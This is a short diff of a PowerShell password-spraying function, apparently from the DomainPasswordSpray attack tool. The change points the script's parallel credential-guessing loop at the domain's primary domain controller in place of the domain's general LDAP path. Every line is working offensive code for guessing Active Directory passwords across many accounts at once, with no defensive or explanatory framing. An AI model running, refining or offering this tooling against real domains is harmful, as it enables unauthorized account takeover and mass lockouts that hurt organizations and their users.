@@ -79,7 +79,8 @@ function Invoke-DomainPasswordSpray {
 	
 	try {
 		# Using domain specified with -DomainName option
-		$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$DomainName").distinguishedName
+		# $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$DomainName").distinguishedName
+		$CurrentPdc = "LDAP://$($DomainObject.PdcRoleOwner.Name)"
 		
 	} catch {
 		Write-Error '[*] Could not connect to the domain. Try again specifying the domain name with the -DomainName option'
@@ -154,7 +155,7 @@ function Invoke-DomainPasswordSpray {
 		$UserName | Invoke-Parallel -ImportVariables -Throttle 20 -Verbose:$false @InvokeParallelParams -ScriptBlock {
 			
 			
-			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentDomain, $_, $Using:PasswordItem)
+			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentPdc, $_, $Using:PasswordItem)
 			
 			if ($TestDomain.Name -ne $null) {
 				
